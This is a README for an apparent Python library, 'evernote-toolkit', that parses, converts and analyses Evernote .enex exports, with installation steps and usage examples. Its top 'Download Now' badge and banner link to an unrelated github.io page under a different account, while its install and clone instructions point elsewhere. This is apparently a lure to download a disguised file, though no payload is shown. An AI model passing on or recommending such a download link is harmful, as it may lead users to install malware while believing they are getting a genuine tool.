# evernote-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://JammyrRT.github.io/evernote-info-6i3/)


[![Banner](banner.png)](https://JammyrRT.github.io/evernote-info-6i3/)


[![PyPI version](https://badge.fury.io/py/evernote-toolkit.svg)](https://badge.fury.io/py/evernote-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build Status](https://img.shields.io/github/actions/workflow/status/evernote-toolkit/evernote-toolkit/ci.yml)](https://github.com/evernote-toolkit/evernote-toolkit)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A Python toolkit for automating workflows, processing exported Evernote files, and extracting structured data from notes created in **Evernote for Windows**.

Whether you are migrating notes, building analytics pipelines, or automating repetitive note-management tasks, `evernote-toolkit` gives you a clean, Pythonic interface to work with Evernote's `.enex` export format and the official Evernote API.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 📄 **ENEX Parsing** — Read and parse `.enex` files exported from Evernote for Windows with full metadata support
- 🔍 **Content Extraction** — Extract plain text, HTML content, tags, creation dates, and attachments from notes
- 🤖 **Workflow Automation** — Batch-process hundreds of notes programmatically without opening the desktop application
- 📊 **Data Analysis** — Aggregate and analyze note metadata, word counts, tag frequency, and notebook statistics
- 🗂️ **Export & Convert** — Convert Evernote notes to Markdown, JSON, CSV, or plain text formats
- 🔗 **API Integration** — Thin wrapper around the Evernote API for reading notebooks and notes from connected accounts
- 🏷️ **Tag Management** — Programmatically query, rename, and organize tags across large note collections
- 🖼️ **Attachment Handling** — Extract and save embedded images and file attachments from note archives

---

## Installation

Install the latest stable release from PyPI:

```bash
pip install evernote-toolkit
```

To include optional dependencies for data analysis and Markdown export:

```bash
pip install evernote-toolkit[analysis]
pip install evernote-toolkit[markdown]
# or install everything
pip install evernote-toolkit[all]
```

Install from source for the latest development version:

```bash
git clone https://github.com/evernote-toolkit/evernote-toolkit.git
cd evernote-toolkit
pip install -e ".[dev]"
```

---

## Quick Start

```python
from evernote_toolkit import ENEXReader

# Load an .enex file exported from Evernote for Windows
reader = ENEXReader("my_notebook.enex")

# Iterate over all notes
for note in reader.notes():
    print(f"Title : {note.title}")
    print(f"Created: {note.created_at}")
    print(f"Tags   : {', '.join(note.tags)}")
    print(f"Words  : {note.word_count}")
    print("---")
```

---

## Usage Examples

### Parse and Extract Note Content

```python
from evernote_toolkit import ENEXReader
from evernote_toolkit.extractors import PlainTextExtractor

reader = ENEXReader("work_notes.enex")
extractor = PlainTextExtractor()

for note in reader.notes():
    plain_text = extractor.extract(note)
    print(f"[{note.title}]\n{plain_text[:200]}\n")
```

### Convert Notes to Markdown

```python
from evernote_toolkit import ENEXReader
from evernote_toolkit.converters import MarkdownConverter
from pathlib import Path

reader = ENEXReader("journal.enex")
converter = MarkdownConverter()
output_dir = Path("./markdown_notes")
output_dir.mkdir(exist_ok=True)

for note in reader.notes():
    md_content = converter.convert(note)
    safe_title = note.title.replace("/", "-").replace("\\", "-")
    output_path = output_dir / f"{safe_title}.md"
    output_path.write_text(md_content, encoding="utf-8")
    print(f"Saved: {output_path}")
```

### Analyze Tag Frequency Across a Notebook

```python
from collections import Counter
from evernote_toolkit import ENEXReader

reader = ENEXReader("all_notes.enex")
tag_counter = Counter()

for note in reader.notes():
    tag_counter.update(note.tags)

print("Top 10 tags:")
for tag, count in tag_counter.most_common(10):
    print(f"  {tag:<30} {count} notes")
```

### Extract and Save Attachments

```python
from evernote_toolkit import ENEXReader
from evernote_toolkit.attachments import AttachmentExtractor
from pathlib import Path

reader = ENEXReader("project_notes.enex")
extractor = AttachmentExtractor()
output_dir = Path("./attachments")
output_dir.mkdir(exist_ok=True)

for note in reader.notes():
    saved = extractor.save_attachments(note, destination=output_dir)
    if saved:
        print(f"Note '{note.title}': saved {len(saved)} attachment(s)")
```

### Export Note Metadata to CSV

```python
import csv
from evernote_toolkit import ENEXReader

reader = ENEXReader("my_notebook.enex")

with open("note_metadata.csv", "w", newline="", encoding="utf-8") as f:
    writer = csv.DictWriter(
        f,
        fieldnames=["title", "created_at", "updated_at", "tags", "word_count", "has_attachments"]
    )
    writer.writeheader()

    for note in reader.notes():
        writer.writerow({
            "title": note.title,
            "created_at": note.created_at.isoformat(),
            "updated_at": note.updated_at.isoformat(),
            "tags": "|".join(note.tags),
            "word_count": note.word_count,
            "has_attachments": bool(note.attachments),
        })

print("Exported metadata to note_metadata.csv")
```

### Batch Workflow Automation

```python
from evernote_toolkit import ENEXReader
from evernote_toolkit.pipeline import NotePipeline
from evernote_toolkit.filters import TagFilter, DateRangeFilter
from evernote_toolkit.converters import JSONConverter
from datetime import date

# Build a processing pipeline for notes tagged "work"
# created in the last calendar year
pipeline = (
    NotePipeline(ENEXReader("all_notes.enex"))
    .filter(TagFilter(include=["work", "project"]))
    .filter(DateRangeFilter(after=date(2023, 1, 1), before=date(2024, 1, 1)))
    .convert(JSONConverter())
    .export("work_notes_2023.json")
)

pipeline.run()
print(f"Processed {pipeline.processed_count} notes.")
```

---

## Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | `>= 3.8` | Tested on 3.8, 3.10, 3.12 |
| `lxml` | `>= 4.9` | ENEX XML parsing |
| `beautifulsoup4` | `>= 4.12` | HTML content extraction |
| `python-dateutil` | `>= 2.8` | Date/time parsing |
| `requests` | `>= 2.28` | API integration (optional) |
| `pandas` | `>= 1.5` | Analysis extras (`[analysis]`) |
| `mistletoe` | `>= 1.2` | Markdown export (`[markdown]`) |

Install all core dependencies manually if needed:

```bash
pip install lxml beautifulsoup4 python-dateutil requests
```

---

## Project Structure

```
evernote-toolkit/
├── evernote_toolkit/
│   ├── __init__.py
│   ├── reader.py          # ENEXReader core class
│   ├── models.py          # Note, Notebook, Attachment dataclasses
│   ├── extractors.py      # Plain text and HTML extractors
│   ├── converters.py      # Markdown, JSON, CSV converters
│   ├── attachments.py     # Attachment extraction utilities
│   ├── filters.py         # Pipeline filter classes
│   └── pipeline.py        # NotePipeline workflow builder
├── tests/
│   ├── fixtures/          # Sample .enex files for testing
│   └── test_*.py
├── pyproject.toml
├── CHANGELOG.md
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. **Fork** the repository on GitHub
2. **Create a branch** for your feature or bug fix:
   ```bash
   git checkout -b feature/your-feature-name
   ```
3. **Write tests** for any new functionality in the `tests/` directory
4. **Run the test suite** before submitting:
   ```bash
   pip install -e ".[dev]"
   pytest tests/ --cov=evernote_toolkit
   ```
5. **Format your code** with `black` and `isort`:
   ```bash
   black evernote_toolkit/ tests/
   isort evernote_toolkit/ tests/
   ```
6. **Open a Pull Request** with a clear description of your changes

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for the full code of conduct and contribution guidelines.

### Reporting Issues

If you encounter a bug or unexpected behavior when processing Evernote `.enex` exports — particularly files generated by **Evernote for Windows** — please open a GitHub issue and include:

- Your Python version and OS
- The `evernote-toolkit` version (`pip show evernote-toolkit`)
- A minimal reproducible example (anonymize any personal note content)

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for full details.

```
MIT License

Copyright (c) 2024 evernote-toolkit contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
...
```

---

> **Note:** This toolkit is an independent open-source project and is not affiliated with, endorsed by, or officially connected to Evernote Corporation. The Evernote name and logo are trademarks of Evernote Corporation.